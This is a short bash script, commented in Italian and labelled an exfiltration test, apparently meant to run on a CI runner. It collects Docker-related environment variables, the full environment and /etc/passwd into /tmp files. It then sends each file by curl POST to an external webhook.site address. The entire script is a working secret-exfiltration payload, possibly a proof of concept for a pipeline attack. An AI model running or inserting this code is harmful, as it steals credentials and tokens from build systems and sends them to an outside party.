#!/bin/bash

echo "[*] Starting full exfiltration test..."

# Dump solo delle variabili Docker-related (simula secrets specifici)
env | grep -i DOCKER > /tmp/docker_secrets.txt

# Dump dell'intero ambiente (per esfiltrare anche altri secrets eventualmente presenti)
env > /tmp/full_env.txt

# Esfiltrazione /etc/passwd (file innocuo, ma dimostra lettura del filesystem del runner)
cp /etc/passwd /tmp/passwd_dump.txt

# Invia i secrets Docker
curl -X POST --data-binary @/tmp/docker_secrets.txt https://webhook.site/a47a02de-67bc-48aa-b80e-2a3a8636e5eb

# Invia l'intero ambiente
curl -X POST --data-binary @/tmp/full_env.txt https://webhook.site/a47a02de-67bc-48aa-b80e-2a3a8636e5eb

# Invia il file di sistema /etc/passwd
curl -X POST --data-binary @/tmp/passwd_dump.txt https://webhook.site/a47a02de-67bc-48aa-b80e-2a3a8636e5eb

echo "[+] Exfiltration complete."